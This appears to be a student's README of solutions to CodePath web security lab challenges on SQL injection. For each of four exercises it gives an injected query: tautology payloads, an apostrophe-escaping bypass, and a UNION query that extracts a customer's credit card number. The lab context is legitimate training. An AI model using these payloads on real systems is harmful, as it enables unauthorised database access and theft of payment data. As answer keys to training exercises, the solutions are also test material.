# Web-Securities-Labs
codepath Web Securities labs

## Week 2
SQL injections:
1) To complete this challenge, you must exploit SQL injection flaw in the following form to find the result key.

Please enter the Customer Id of the user that you want to look up: 
``` SELECT * FROM customers WHERE customerId ="1" OR '1' = '1'; -- ";```

2) To complete this challenge, you must exploit the SQL injection flaw in the following form to find the result key.

Please enter the Customer Email of the user that you want to look up:
``` SELECT * FROM customers WHERE customerEmail ="samman@gmail.com' OR '1' = '1'; -- "@gmail.com ```

3) To complete this challenge, you must exploit SQL injection flaw in the following form to find the result key. The developer of this level has attempted to stop SQL Injection attacks by escaping apostrophes so the database interpreter will know not to pay attention to user submitted apostrophes.
```SELECT * FROM customers WHERE customerId ="2\' OR 1 = 1;-- "; ```

4) To complete this challenge, you must exploit a SQL injection issue in the following sub application to acquire the credit card number from one of the customers that has a customer name of Mary Martin. Mary's credit card number is the result key to this challenge.
``` SELECT customerName from customers where customerName='Mary MArtin' Union select CreditCardNumber from customers where customerName="mary martin"; # ```
